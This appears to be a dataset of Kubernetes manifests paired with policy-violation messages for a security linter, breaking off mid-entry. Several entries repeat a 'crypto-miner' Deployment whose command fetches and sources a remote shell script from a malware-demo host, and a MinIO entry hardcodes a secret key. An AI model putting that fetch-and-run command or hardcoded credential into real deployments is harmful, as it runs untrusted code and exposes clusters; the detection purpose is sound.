[
  {
    "id": "03441",
    "manifest_path": "data/manifests/the_stack_sample/sample_1494.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: cpu-demo-ctr\n    image: vish/stress\n    resources:\n      requests:\n        cpu: 1\n        memory: 1G\n      limits:\n        cpu: 1\n        memory: 1G\n    args:\n    - -cpus\n    - '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cpu-demo-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "03442",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job1\" does not have a read-only root file system"
  },
  {
    "id": "03443",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job1\" is not set to runAsNonRoot"
  },
  {
    "id": "03444",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job1\" has cpu request 0"
  },
  {
    "id": "03445",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job1\" has memory limit 0"
  },
  {
    "id": "03446",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongodb-trdc\" is using an invalid container image, \"triviman/mongodb-trdc:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03447",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongodb-trdc\" does not have a read-only root file system"
  },
  {
    "id": "03448",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongodb-trdc\" is not set to runAsNonRoot"
  },
  {
    "id": "03449",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongodb-trdc\" has cpu request 0"
  },
  {
    "id": "03450",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongodb-trdc\" has memory limit 0"
  },
  {
    "id": "03451",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nsmgr\" is using an invalid container image, \"registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03452",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nsmgr\" does not have a read-only root file system"
  },
  {
    "id": "03453",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nsmgr\" is not set to runAsNonRoot"
  },
  {
    "id": "03454",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nsmgr\" has cpu request 0"
  },
  {
    "id": "03455",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nsmgr\" has memory limit 0"
  },
  {
    "id": "03456",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03457",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03458",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03459",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03460",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03461",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "03462",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "03463",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "03464",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "03465",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03466",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03467",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03468",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03469",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03470",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"crypto-miner\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03471",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crypto-miner\" does not have a read-only root file system"
  },
  {
    "id": "03472",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crypto-miner\" is not set to runAsNonRoot"
  },
  {
    "id": "03473",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crypto-miner\" has cpu request 0"
  },
  {
    "id": "03474",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crypto-miner\" has memory limit 0"
  },
  {
    "id": "03475",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "03476",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "03477",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "03478",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
